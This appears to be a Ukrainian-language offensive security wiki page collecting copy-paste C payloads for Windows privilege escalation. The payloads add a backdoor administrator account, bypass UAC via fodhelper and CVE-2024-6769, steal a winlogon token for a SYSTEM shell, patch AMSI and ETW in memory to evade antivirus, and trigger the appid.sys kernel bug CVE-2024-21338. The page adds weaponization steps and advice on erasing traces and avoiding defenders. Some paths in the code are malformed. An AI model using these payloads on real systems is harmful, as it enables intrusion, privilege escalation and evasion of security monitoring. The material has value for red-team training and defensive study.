# Windows C Payloads

{{#include ../../banners/hacktricks-training.md}}

На цій сторінці зібрано **невеликі автономні фрагменти коду C**, які можуть бути корисними під час Windows Local Privilege Escalation або post-exploitation. Кожен payload розроблено так, щоб його було зручно **копіювати та вставляти**; він використовує лише Windows API / C runtime і може бути скомпільований за допомогою `i686-w64-mingw32-gcc` (x86) або `x86_64-w64-mingw32-gcc` (x64).

> ⚠️  Ці payloads передбачають, що процес уже має мінімальні привілеї, необхідні для виконання дії (наприклад, `SeDebugPrivilege`, `SeImpersonatePrivilege` або контекст із середнім рівнем цілісності для UAC bypass). Вони призначені для **red-team або CTF-середовищ**, де експлуатація вразливості забезпечила виконання довільного native code.

---

## Додати локального адміністратора-користувача
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
---

## UAC Bypass – `fodhelper.exe` Registry Hijack (Medium → High цілісність)
Коли виконується довірений бінарний файл **`fodhelper.exe`**, він запитує наведений нижче шлях у реєстрі **без фільтрації verb `DelegateExecute`**. Розмістивши нашу команду під цим ключем, зловмисник може обійти UAC *без запису файлу на диск*.<sup>[[1]](#references)</sup>

*Шлях у реєстрі, який запитує `fodhelper.exe`*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
Мінімальний PoC, який запускає `cmd.exe` з підвищеними привілеями:
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*Протестовано на Windows 10 22H2 і Windows 11 23H2 (патчі за липень 2025 року). Обхід усе ще працює, оскільки Microsoft не виправила відсутню перевірку цілісності в шляху `DelegateExecute`.*

---

## UAC Bypass – Activation Context Cache Poisoning (`ctfmon.exe`, CVE-2024-6769)
Перепризначення диска + отруєння кешу контексту активації все ще працюють проти пропатчених збірок Windows 10/11, оскільки `ctfmon.exe` запускається як довірений UI-процес із високою цілісністю, який без проблем завантажує дані з impersonated-диска `C:` викликувача та повторно використовує будь-які перенаправлення DLL, кешовані `CSRSS`. Експлуатація відбувається так: перенаправити `C:` на контрольоване атакувальником сховище, розмістити троянізований `msctf.dll`, запустити `ctfmon.exe` для отримання високого рівня цілісності, а потім попросити `CSRSS` кешувати маніфест, який перенаправляє DLL, що використовується auto-elevated бінарним файлом (наприклад, `fodhelper.exe`), щоб наступний запуск успадкував ваш payload без UAC prompt.<sup>[[5]](#references)</sup>

Практичний workflow:
1. Підготуйте фальшиве дерево `%SystemRoot%\System32` і скопіюйте легітимний бінарний файл, який ви плануєте перехопити (часто `ctfmon.exe`).
2. Використайте `DefineDosDevice(DDD_RAW_TARGET_PATH)`, щоб перенаправити `C:` у межах вашого процесу, залишивши `DDD_NO_BROADCAST_SYSTEM`, аби зміна залишалася локальною.
3. Розмістіть вашу DLL і маніфест у фальшивому дереві, викличте `CreateActCtx/ActivateActCtx`, щоб додати маніфест до кешу контексту активації, а потім запустіть auto-elevated бінарний файл, щоб він безпосередньо завантажив перенаправлену DLL у ваш shellcode.
4. Видаліть запис із кешу (`sxstrace ClearCache`) або перезавантажте систему після завершення, щоб стерти сліди атакувальника.

<details>
<summary>C - Помічник для отруєння фальшивого диска й маніфесту (CVE-2024-6769)</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")

BOOL WriteWideFile(const wchar_t *path, const wchar_t *data) {
HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if (h == INVALID_HANDLE_VALUE) return FALSE;
DWORD bytes = (DWORD)(wcslen(data) * sizeof(wchar_t));
BOOL ok = WriteFile(h, data, bytes, &bytes, NULL);
CloseHandle(h);
return ok;
}

int wmain(void) {
const wchar_t *stage = L"C:\\Users\\Public\\fakeC\\Windows\\System32";
SHCreateDirectoryExW(NULL, stage, NULL);
CopyFileW(L"C:\\Windows\\System32\\ctfmon.exe", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\ctfmon.exe", FALSE);
CopyFileW(L".\\msctf.dll", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll", FALSE);

DefineDosDeviceW(DDD_RAW_TARGET_PATH | DDD_NO_BROADCAST_SYSTEM,
L"C:", L"\\??\\C:\\Users\\Public\\fakeC");

const wchar_t manifest[] =
L"<?xml version='1.0' encoding='UTF-8' standalone='yes'?>"
L"<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>"
L" <dependency><dependentAssembly>"
L"  <assemblyIdentity name='Microsoft.Windows.Common-Controls' version='6.0.0.0'"
L"   processorArchitecture='amd64' publicKeyToken='6595b64144ccf1df' language='*' />"
L"  <file name='advapi32.dll' loadFrom='C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll' />"
L" </dependentAssembly></dependency></assembly>";
WriteWideFile(L"C:\\Users\\Public\\fakeC\\payload.manifest", manifest);

ACTCTXW act = { sizeof(act) };
act.lpSource = L"C:\\Users\\Public\\fakeC\\payload.manifest";
ULONG_PTR cookie = 0;
HANDLE ctx = CreateActCtxW(&act);
ActivateActCtx(ctx, &cookie);

STARTUPINFOW si = { sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
CreateProcessW(L"C:\\Windows\\System32\\ctfmon.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

WaitForSingleObject(pi.hProcess, 2000);
DefineDosDeviceW(DDD_REMOVE_DEFINITION, L"C:", L"\\??\\C:\\Users\\Public\\fakeC");
return 0;
}
```
</details>

Порада щодо очищення: після отримання SYSTEM викличте `sxstrace Trace -logfile %TEMP%\sxstrace.etl`, а потім `sxstrace Parse` під час тестування — якщо в журналі видно назву вашого manifest, захисники також її побачать, тож змінюйте шляхи під час кожного запуску.

---

## Spawn SYSTEM shell via token duplication (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
Якщо поточний процес має **обидва** привілеї — `SeDebug` і `SeImpersonate` (що типово для багатьох облікових записів служб), можна викрасти token з `winlogon.exe`, дублювати його та запустити elevated process:
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
Для детальнішого пояснення принципу роботи дивіться:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## In-Memory AMSI & ETW Patch (Defence Evasion)
Більшість сучасних AV/EDR-рушіїв покладаються на **AMSI** та **ETW** для перевірки шкідливої поведінки. Патчинг обох інтерфейсів на ранньому етапі всередині поточного процесу запобігає скануванню payloads на основі скриптів (наприклад, PowerShell, JScript).<sup>[[2]](#references)</sup>
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*Наведений вище patch діє лише в межах процесу; створення нового PowerShell після його запуску виконуватиметься без перевірки AMSI/ETW.*

---

## Створення дочірнього процесу як Protected Process Light (PPL)
Запросіть рівень захисту PPL для дочірнього процесу під час його створення, використовуючи `STARTUPINFOEX` + `PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL`. Це задокументований API, і він буде успішним лише за умови, що цільовий image підписаний для запитаного класу підписанта (Windows/WindowsLight/Antimalware/LSA/WinTcb).<sup>[[3]](#references)[[4]](#references)</sup>
```c
// x86_64-w64-mingw32-gcc -O2 -o spawn_ppl.exe spawn_ppl.c
#include <windows.h>

int wmain(void) {
STARTUPINFOEXW si = {0};
PROCESS_INFORMATION pi = {0};
si.StartupInfo.cb = sizeof(si);

SIZE_T attrSize = 0;
InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);

DWORD lvl = PROTECTION_LEVEL_ANTIMALWARE_LIGHT; // choose the desired level
UpdateProcThreadAttribute(si.lpAttributeList, 0,
PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL,
&lvl, sizeof(lvl), NULL, NULL);

if (!CreateProcessW(L"C\\\Windows\\\System32\\\notepad.exe", NULL, NULL, NULL, FALSE,
EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
// likely ERROR_INVALID_IMAGE_HASH (577) if the image is not properly signed for that level
return 1;
}
DeleteProcThreadAttributeList(si.lpAttributeList);
HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
CloseHandle(pi.hThread);
CloseHandle(pi.hProcess);
return 0;
}
```
Найчастіше використовувані рівні:
- `PROTECTION_LEVEL_WINDOWS_LIGHT` (2)
- `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` (3)
- `PROTECTION_LEVEL_LSA_LIGHT` (4)

Перевірте результат за допомогою Process Explorer/Process Hacker, переглянувши стовпчик Protection.

---

## Local Service -> Kernel через Smart-Hash `appid.sys` (`IOCTL 0x22A018`, CVE-2024-21338)
`appid.sys` відкриває об’єкт пристрою (`\\.\\AppID`), чий IOCTL обслуговування smart-hash приймає вказівники на функції, надані користувачем, якщо caller працює як `LOCAL SERVICE`; Lazarus використовує це для вимкнення PPL і завантаження довільних драйверів, тому red teams мають підготувати готовий trigger для використання в лабораторії.<sup>[[6]](#references)</sup>

Операційні примітки:
- Вам усе ще потрібен токен `LOCAL SERVICE`. Викрадіть його з `Schedule` або `WdiServiceHost` за допомогою `SeImpersonatePrivilege`, а потім виконайте impersonation перед взаємодією з пристроєм, щоб перевірки ACL пройшли успішно.
- IOCTL `0x22A018` очікує структуру, що містить два callback pointers (довжина запиту + функція читання). Вкажіть обидва на user-mode stubs, які створюють перезапис токена або відображають ring-0 primitives, але залиште буфери RWX, щоб KernelPatchGuard не спричинив збій посеред chain.
- Після успішного виконання припиніть impersonation і закрийте дескриптор пристрою; defenders тепер шукають неочікувані дескриптори `Device\\AppID`, тому негайно закрийте його після отримання привілеїв.

<details>
<summary>C - Skeleton trigger для зловживання smart-hash `appid.sys`</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>

typedef struct _APPID_SMART_HASH {
ULONGLONG UnknownCtx[4];
PVOID QuerySize;   // called first
PVOID ReadBuffer;  // called with size returned above
BYTE  Reserved[0x40];
} APPID_SMART_HASH;

DWORD WINAPI KernelThunk(PVOID ctx) {
// map SYSTEM shellcode, steal token, etc.
return 0;
}

int wmain(void) {
HANDLE hDev = CreateFileW(L"\\\\.\\AppID", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
if (hDev == INVALID_HANDLE_VALUE) {
printf("[-] CreateFileW failed: %lu\n", GetLastError());
return 1;
}

APPID_SMART_HASH in = {0};
in.QuerySize = KernelThunk;
in.ReadBuffer = KernelThunk;

DWORD bytes = 0;
if (!DeviceIoControl(hDev, 0x22A018, &in, sizeof(in), NULL, 0, &bytes, NULL)) {
printf("[-] DeviceIoControl failed: %lu\n", GetLastError());
}
CloseHandle(hDev);
return 0;
}
```
</details>

Мінімальне доопрацювання для weaponized build: замапте секцію RWX за допомогою `VirtualAlloc`, скопіюйте туди свій token duplication stub, встановіть `KernelThunk = section`, і після повернення `DeviceIoControl` ви маєте отримати права SYSTEM навіть у PPL.

---

## Посилання

- [1] [Перший запис: Вітаємо та fileless UAC bypass](https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/)
- [2] [Memory Patching AMSI Bypass](https://rastamouse.me/memory-patching-amsi-bypass/)
- [3] [CreateProcessAsPPL – мінімальний launcher для PPL-процесів](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [4] [Функція UpdateProcThreadAttribute (програми Win32) — Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute)
- [5] [Новий exploit chain забезпечує UAC bypass у Windows](https://www.darkreading.com/vulnerabilities-threats/exploit-chain-windows-uac-bypass)
- [6] [Lazarus і rootkit FudModule: за межами BYOVD — Admin-to-Kernel Zero-Day](https://www.gendigital.com/blog/insights/research/lazarus-and-the-fudmodule-rootkit-beyond-byovd-with-an-admin-to-kernel-zero-day)

{{#include ../../banners/hacktricks-training.md}}
